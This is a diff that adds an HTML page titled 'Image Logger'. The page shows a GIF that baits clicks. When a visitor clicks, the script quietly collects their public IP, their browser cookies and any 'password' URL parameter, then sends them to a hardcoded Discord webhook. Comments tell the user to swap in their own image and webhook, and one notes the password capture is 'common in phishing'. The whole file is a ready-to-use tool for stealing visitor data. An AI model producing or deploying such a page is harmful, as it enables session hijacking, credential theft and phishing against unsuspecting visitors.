@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Logger</title>
+    <style>
+        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f5; }
+        .logger-container { position: relative; cursor: pointer; }
+        img, gif { max-width: 100%; max-height: 80vh; display: block; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.2); transition: transform 0.1s; }
+        img:hover, gif:hover { transform: scale(1.02); }
+        .loading-overlay { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; animation: spin 1s linear infinite; display: none; }
+        @keyframes spin { 0% { transform: translate(-50%, -50%) rotate(0deg); } 100% { transform: translate(-50%, -50%) rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="logger-container" id="clickTarget">
+    <!-- REPLACE 'src' WITH YOUR GIF OR IMAGE URL -->
+    <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExYmZlOGQ4ZDlmOGJkNzRiMWVhM2I0YjFjMjBkYjNlYjJpMjJqNnB5eSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7btO7yOsDOhT4zWO/giphy.gif" alt="Click Me!" id="targetImage">
+    <div class="loading-overlay" id="loader"></div>
+</div>
+
+<script>
+    const clickTarget = document.getElementById('clickTarget');
+    const loader = document.getElementById('loader');
+
+    // REPLACE WITH YOUR DISCORD WEBHOOK URL
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1555843447338827836/8Z2Idj3ghmLorJ635TcAiYETyF2i6O5jEYN_Vy5-gR2yU0wZXJMa4HEzk0vd0oM4HgKi";
+
+    // Function to get user's public IP (using a free API)
+    async function getUserIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            return "Unknown IP";
+        }
+    }
+
+    // Function to capture cookies and store them as a string
+    function getCookies() {
+        return document.cookie || "(No Cookies Found)";
+    }
+
+    // Function to get password from URL parameters if present (common in phishing)
+    function getPasswordFromURL() {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get('password') || "None";
+    }
+
+    clickTarget.addEventListener('click', async () => {
+        // Show loading spinner
+        loader.style.display = 'block';
+
+        try {
+            const ip = await getUserIP();
+            const cookies = getCookies();
+            const password = getPasswordFromURL();
+
+            // Prepare payload for Discord Webhook
+            const payload = {
+                content: null,
+                embeds: [{
+                    title: "🖱️ Image Clicked!",
+                    color: 5814783, // Blue
+                    fields: [
+                        { name: "🌐 IP Address", value: ip, inline: true },
+                        { name: "🔑 Password (URL)", value: password, inline: true },
+                        { name: "🍪 Cookies", value: cookies.length > 100 ? cookies.substring(0, 100) + '...' : cookies }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: { text: "Image Logger Bot" }
+                }]
+            };
+
+            // Send data to Discord Webhook
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+        } catch (error) {
+            console.error("Logging failed:", error);
+        } finally {
+            // Hide loading spinner
+            loader.style.display = 'none';
+        }
+    });
+</script>
+
+</body>
+</html>
